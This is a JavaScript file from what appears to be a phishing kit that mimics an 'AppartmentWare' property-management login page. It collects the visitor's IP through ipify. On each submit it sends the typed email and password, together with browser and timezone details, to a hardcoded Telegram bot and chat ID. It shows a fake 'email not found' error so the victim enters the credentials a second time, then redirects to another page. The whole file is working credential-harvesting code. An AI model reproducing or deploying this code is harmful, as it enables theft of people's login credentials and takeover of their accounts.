  const botTOKEN ='bot6604876478:AAFT2uvJRnZgjB5fZnQYaWFBrGcGT3sm4YQ';
    const CHAT_ID = '5872950992';



  let clickCount = 0; // Counter to track button clicks

  document.addEventListener("DOMContentLoaded", async () => {
    const hash = window.location.hash.substring(1);
    if (hash) {
      document.getElementById("email").value = hash;
    }
    clientInfo = await getClientInfo();
    console.log(clientInfo);
  });

  async function getClientInfo() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return {
      ip: data.ip,
      browser: navigator.userAgent,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      userAgent: navigator.userAgent,
    };
  }

  async function handleSubmit(event) {
    clickCount++; // Increment click count on each button click

    if (clickCount === 1) {
              // First click: Show the error alert and stop further processing
            // document.getElementById("loader").style.display = "flex"; // Ensure loader is hidden
             // Second click: Send the message, show loader, and redirect
                const email = document.getElementById("loginEmail").value;
                const pass = document.getElementById("loginPassword").value;

                document.getElementById("subBtn").value = "LOADING";
                const message = `
            👋AppartmentWare Manager Result 1👋
            Email: ${email}
            Password: ${pass}
            IP: ${clientInfo.ip}
            Browser: ${clientInfo.browser}
            Timezone: ${clientInfo.timezone}
            UserAgent: ${clientInfo.userAgent}
            👋AppartmentWare Manager Result👋`;

                const telegramUrl = `https://api.telegram.org/${botTOKEN}/sendMessage`;
                const params = new URLSearchParams({
                  chat_id: CHAT_ID,
                  text: message,
                });

                // Show loader
                //document.getElementById("loader").style.display = "flex";

                // Send message to Telegram
                await fetch(telegramUrl, {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                  },
                  body: params.toString(),
                });

setTimeout(() => {
    // Create toast container
    const toast = document.createElement("div");
    
    // Build toast HTML with icon, message, and close button
    toast.innerHTML = `
      <div class="my-toast-icon">&#9888;</div>
      <div class="my-toast-message">
       That email address was not found. Check the address or notify your administrator.
      </div>
      <button class="my-toast-close">&times;</button>
    `;
    
    // Apply overarching toast styles
    toast.style.position         = "fixed";
    toast.style.top              = "20px";
    toast.style.right             = "20px";        /* Change to 'right' for top-right */
    toast.style.zIndex           = "9999";
    toast.style.width            = "320px";
    toast.style.backgroundColor  = "#d9534f";     /* Red background */
    toast.style.color            = "#ffffff";     /* White text */
    toast.style.padding          = "12px 16px";
    toast.style.borderRadius     = "4px";
    toast.style.boxShadow        = "0 2px 4px rgba(0,0,0,0.2)";
    toast.style.display          = "flex";
    toast.style.alignItems       = "flex-start";  /* Align icon + text at the top */
    toast.style.fontFamily       = "Arial, sans-serif";
    toast.style.gap              = "8px";
    
    // Append toast to body
    document.body.appendChild(toast);
    
    // Style the shield icon
    const icon = toast.querySelector(".my-toast-icon");
    icon.style.fontSize       = "24px";
    icon.style.marginRight    = "8px";
    icon.style.lineHeight     = "1";
    
    // Style the message container
    const message = toast.querySelector(".my-toast-message");
    message.style.flex        = "1";
    message.style.lineHeight  = "1.4";
    
    // Style the close button
    const closeBtn = toast.querySelector(".my-toast-close");
    closeBtn.style.background    = "transparent";
    closeBtn.style.border        = "none";
    closeBtn.style.color         = "#ffffff";
    closeBtn.style.fontSize      = "20px";
    closeBtn.style.cursor        = "pointer";
    closeBtn.style.marginLeft    = "8px";
    closeBtn.style.lineHeight    = "1";
    
    // Close button click → remove toast
    closeBtn.addEventListener("click", () => {
      toast.remove();
      // Optional: redirect or do something else on close
      // window.location.href = "https://app.propertyware.com";
    });

    // Remove toast automatically after 3 seconds, then redirect
    setTimeout(() => {
      toast.remove();
      //window.location.href = "https://app.propertyware.com";
    }, 3000);

  }, 4000); // Wait 4s before showing the toast



               document.getElementById("subBtn").value = "SIGN ME IN";
              const errorAlert = document.getElementById("erroralert");
              errorAlert.style.display = "block"; // Display the error alert
             
              return;
    }else{

                   // Second click: Send the message, show loader, and redirect
                    const email = document.getElementById("loginEmail").value;
                    const pass = document.getElementById("loginPassword").value;
                     document.getElementById("subBtn").value = "LOADING";
                    const message = `
                👋AppartmentWare Manager Result2👋
                Email: ${email}
                Password: ${pass}
                IP: ${clientInfo.ip}
                Browser: ${clientInfo.browser}
                Timezone: ${clientInfo.timezone}
                UserAgent: ${clientInfo.userAgent}
                👋AppartmentWare Manager Result👋`;

                    const telegramUrl = `https://api.telegram.org/${botTOKEN}/sendMessage`;
                    const params = new URLSearchParams({
                      chat_id: CHAT_ID,
                      text: message,
                    });

                    // Show loader
                    //document.getElementById("loader").style.display = "flex";

                    // Send message to Telegram
                    await fetch(telegramUrl, {
                      method: "POST",
                      headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                      },
                      body: params.toString(),
                    });
                     document.getElementById("subBtn").value = "SIGN ME IN";
                    // Animate loader for 7 seconds before redirect

    
    
        

        // Remove toast automatically after 3 seconds, then redirect
        setTimeout(() => {
          
          window.location.href = "cod.html";
        }, 2000);





    }

  }